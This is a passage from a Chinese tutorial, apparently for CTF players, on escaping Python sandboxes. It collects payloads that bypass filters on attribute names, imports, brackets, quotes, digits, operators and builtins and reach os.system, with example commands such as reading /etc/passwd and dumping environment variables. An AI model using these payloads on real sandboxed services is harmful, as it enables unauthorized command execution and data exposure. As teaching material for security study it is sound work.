title="过滤了属性名或者函数名："></a><strong>过滤了属性名或者函数名：</strong></h3><p>在 payload 的构造中，我们大量的使用了各种类中的属性，例如 <strong>class__、__import</strong> 等。</p><h4 id="getattr-函数"><a href="#getattr-函数" class="headerlink" title="getattr 函数"></a>getattr 函数</h4><p>getattr 是 Python 的内置函数，用于获取一个对象的属性或者方法。其语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">object</span>, name[, default]) </span><br></pre></td></tr></table></figure><p>这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br></pre></td></tr></table></figure><p>这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。</p><h4 id="getattribute-函数"><a href="#getattribute-函数" class="headerlink" title="__getattribute__ 函数"></a>__getattribute__ 函数</h4><p><code>getattr</code> 函数在调用时，实际上就是调用这个类的 <code>__getattribute__</code> 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.\__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line">os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line">__getattr__ 函数</span><br></pre></td></tr></table></figure><p><strong>getattr</strong> 是 Python 的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个 AttributeError 异常。</p><p>如下是 <strong>getattr</strong> 方法的基本形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure><p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p><p>与 _<em>getattribute</em>_ 不同，<strong>getattr</strong> 只有在属性查找失败时才会被调用，这使得 <strong>getattribute</strong> 可以用来更为全面地控制属性访问。</p><p>如果在一个类中同时定义了 <strong>getattr</strong> 和 <strong>getattribute__，那么无论属性是否存在，__getattribute</strong> 都会被首先调用。只有当 <strong>getattribute</strong> 抛出 AttributeError 异常时，<strong>getattr</strong> 才会被调用。</p><blockquote><p>另外，所有的类都会有__getattribute__属性，而不一定有__getattr__属性。</p></blockquote><h4 id="globals-替换"><a href="#globals-替换" class="headerlink" title="_globals_ 替换"></a><em>_globals</em>_ 替换</h4><p><strong>globals</strong> 可以用 func_globals 直接替换；</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure><p>__mro__、__bases__、__base__互换</p><p>三者之间可以相互替换</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure><h2 id="过滤-import"><a href="#过滤-import" class="headerlink" title="过滤 import"></a>过滤 import</h2><p>python 中除了可以使用 import 来导入，还可以使用 _<em>import</em>_ 和 <code>importlib.import_module</code> 来导入模块</p><p><em>_import</em>_</p><p><em>_import</em>_(‘os’)<br><code>importlib.import_module</code></p><p>注意：importlib 需要进行导入之后才能够使用,所以有些鸡肋。。。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="loader-load-module"><a href="#loader-load-module" class="headerlink" title="__loader__.load_module"></a>__loader__.load_module</h4><p>如果使用 <code>audithook</code> 的方式进行过滤,上面的两种方法就无法使用了,但是 <strong>loader</strong>.load_module 底层实现与 import 不同, 因此某些情况下可以绕过.</p><p><strong>loader</strong>.load_module(‘os’)<br>&lt;module ‘os’ (built-in)&gt;</p><h2 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了 []"></a>过滤了 []</h2><p>如果中括号被过滤了，则可以使用如下的两种方式来绕过：</p><p>调用__getitem__()函数直接替换；<br>调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">200</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>) <span class="comment">#py2</span></span><br></pre></td></tr></table></figure><h3 id="getitem-替换中括号"><a href="#getitem-替换中括号" class="headerlink" title="getitem()替换中括号[]"></a><strong>getitem</strong>()替换中括号[]</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="pop-替换中括号-，结合-getitem-利用"><a href="#pop-替换中括号-，结合-getitem-利用" class="headerlink" title="pop()替换中括号[]，结合__getitem__()利用"></a>pop()替换中括号[]，结合__getitem__()利用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().pop(<span class="number">200</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__,<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="过滤了-‘’"><a href="#过滤了-‘’" class="headerlink" title="过滤了 ‘’"></a>过滤了 ‘’</h2><h3 id="str-函数"><a href="#str-函数" class="headerlink" title="str 函数"></a>str 函数</h3><p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str() 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="chr-函数"><a href="#chr-函数" class="headerlink" title="chr 函数"></a>chr 函数</h3><p>也可以使用 chr 加数字来构造字符串</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chr</span>(<span class="number">56</span>)</span><br><span class="line"><span class="string">&#x27;8&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">100</span>)*<span class="number">40</span></span><br><span class="line"><span class="string">&#x27;dddddddddddddddddddddddddddddddddddddddd&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="list-dict"><a href="#list-dict" class="headerlink" title="list + dict"></a>list + dict</h3><p>使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] </span><br></pre></td></tr></table></figure><h3 id="doc"><a href="#doc" class="headerlink" title="_doc_"></a><em>_doc</em>_</h3><p><em>_doc</em>_ 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]</span><br></pre></td></tr></table></figure><h3 id="bytes-函数"><a href="#bytes-函数" class="headerlink" title="bytes 函数"></a>bytes 函数</h3><p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 <code>decode</code> 则可以得到字符串(python2)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode() </span><br></pre></td></tr></table></figure><h2 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了 +"></a>过滤了 +</h2><p>过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 <code>join</code> 函数，初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 <em>_doc</em>_ 中取，</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>().join(().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>]) </span><br></pre></td></tr></table></figure><h2 id="过滤了数字"><a href="#过滤了数字" class="headerlink" title="过滤了数字"></a>过滤了数字</h2><p>如果过滤了数字的话，可以使用一些函数的返回值获取。</p><p>例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>：<span class="built_in">int</span>(<span class="built_in">bool</span>([]))、Flase、<span class="built_in">len</span>([])、<span class="built_in">any</span>(())</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>：<span class="built_in">int</span>(<span class="built_in">bool</span>([<span class="string">&quot;&quot;</span>]))、<span class="literal">True</span>、<span class="built_in">all</span>(())、<span class="built_in">int</span>(<span class="built_in">list</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(a၁=())).pop()).pop())</span><br></pre></td></tr></table></figure><p>有了 0 之后，其他的数字可以通过运算进行获取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 ** 0 == 1 </span><br><span class="line">1 + 1 == 2 </span><br><span class="line">2 + 1 == 3 </span><br><span class="line">2 ** 2 == 4 </span><br></pre></td></tr></table></figure><p>当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br></pre></td></tr></table></figure><p>第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> -&gt; <span class="built_in">len</span>([])</span><br><span class="line"><span class="number">2</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])</span><br><span class="line"><span class="number">3</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aaa=()))[<span class="built_in">len</span>([])])</span><br></pre></td></tr></table></figure><p>第四种方法: unicode 会在后续的 unicode 绕过中介绍</p><h2 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h2><p>通过 ()、[] 替换</p><h2 id="过滤了运算符"><a href="#过滤了运算符" class="headerlink" title="过滤了运算符"></a>过滤了运算符</h2><p>&#x3D;&#x3D; 可以用 in 来替换</p><p>or 可以用 + 、-、|来替换</p><p>例如</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure><p>and 可以用&amp;、 *替代</p><p>例如</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure><h2 id="过滤了-2"><a href="#过滤了-2" class="headerlink" title="过滤了 ()"></a>过滤了 ()</h2><p>利用装饰器 <code>@</code><br>利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code><br>f 字符串执行</p><p>f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如获取环境变量</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;whoami.__class__.__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].environ&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].path&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].modules&#125;</span><br><span class="line"></span><br><span class="line">&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;</span><br><span class="line"></span><br><span class="line">也可以直接 RCE</span><br><span class="line"></span><br><span class="line"><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="过滤了内建函数"><a href="#过滤了内建函数" class="headerlink" title="过滤了内建函数"></a>过滤了内建函数</h2><p>eval + list + dict 构造</p><p>假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;bool&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;st&#x27;</span>+<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数(<code>__buildin__</code>)。如果某个模块已经被导入了，则也可以获取这个模块中的函数。</p><h2 id="过滤了-和-，如何获取函数"><a href="#过滤了-和-，如何获取函数" class="headerlink" title="过滤了.和 ，如何获取函数"></a>过滤了.和 ，如何获取函数</h2><p>通常情况下，我们会通过点号来进行调用<code>__import__(&#39;binascii&#39;).a2b_base64</code></p><p>或者通过 getattr 函数：<code>getattr(__import__(&#39;binascii&#39;),&#39;a2b_base64&#39;)</code></p><p>如果将,和.都过滤了，则可以有如下的几种方式获取函数：</p><p>内建函数可以使用<code>eval(list(dict(s_t_r=1))[0][::2])</code> 这样的方式获取。</p><p>模块内的函数可以先使用__import__导入函数，然后使用 vars() 进行获取：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vars(__import__(<span class="string">&#x27;binascii&#x27;</span>))[<span class="string">&#x27;a2b_base64&#x27;</span>]</span><br><span class="line">&lt;built-in <span class="keyword">function</span> a2b_base64&gt;</span><br></pre></td></tr></table></figure><h2 id="unicode-绕过"><a href="#unicode-绕过" class="headerlink" title="unicode 绕过"></a>unicode 绕过</h2><p>Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> == 𝘦val</span><br><span class="line"><span class="literal">True</span> </span><br></pre></td></tr></table></figure><p>相似 unicode 寻找网站：<a href="http://shapecatcher.com/">http://shapecatcher.com/</a> 可以通过绘制的方式寻找相似字符</p><p>个人珍藏相似 unicode脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">    tmp=<span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>‘<br>运行运行<br>下面是 0-9,a-z 的 unicode 字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗 𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻  𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 </span><br><span class="line"></span><br><span class="line">下划线可以使用对应的全角字符进行替换：＿</span><br></pre></td></tr></table></figure><p>使用时注意第一个字符不能为全角，否则会报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_＿name_＿) __main__ </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(＿＿name_＿) </span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>    <span class="built_in">print</span>(＿＿name_＿)          </span><br><span class="line">^ SyntaxError: invalid character <span class="string">&#x27;＿&#x27;</span> (U+FF3F) </span><br></pre></td></tr></table></figure><p>需要注意的是，某些 unicode 在遇到 <code>lower()</code> 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意。</p><h2 id="绕过命名空间限制"><a href="#绕过命名空间限制" class="headerlink" title="绕过命名空间限制"></a>绕过命名空间限制</h2><p>部分限制</p><p>有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 